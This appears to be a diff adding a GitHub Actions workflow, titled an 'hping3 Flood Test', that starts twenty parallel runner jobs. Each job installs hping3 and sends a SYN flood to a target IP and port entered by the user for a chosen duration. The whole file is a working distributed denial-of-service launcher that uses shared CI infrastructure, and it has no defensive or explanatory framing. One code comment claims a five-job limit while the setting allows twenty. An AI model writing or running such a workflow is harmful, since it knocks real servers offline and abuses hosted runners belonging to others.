@@ -1,0 +1,36 @@
+name: hping3 Flood Test
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        description: 'Server IP/hostname'
+        required: true
+        default: '192.168.1.100'
+      target_port:
+        description: 'Port TCP target (SYN flood)'
+        required: true
+        default: '80'
+      duration:
+        description: 'Flood duration in seconds'
+        required: true
+        default: '180'
+
+jobs:
+  flood:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        instance: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+      max-parallel: 20  # giới hạn 5 job cùng lúc để tránh nghẽn runner
+
+    steps:
+      - name: Install hping3
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y hping3
+
+      - name: Run hping3 flood
+        run: |
+          echo "Flooding ${{ github.event.inputs.target_ip }}:${{ github.event.inputs.target_port }} for ${{ github.event.inputs.duration }}s"
+          timeout ${{ github.event.inputs.duration }} sudo hping3 --flood -S -p ${{ github.event.inputs.target_port }} ${{ github.event.inputs.target_ip }}
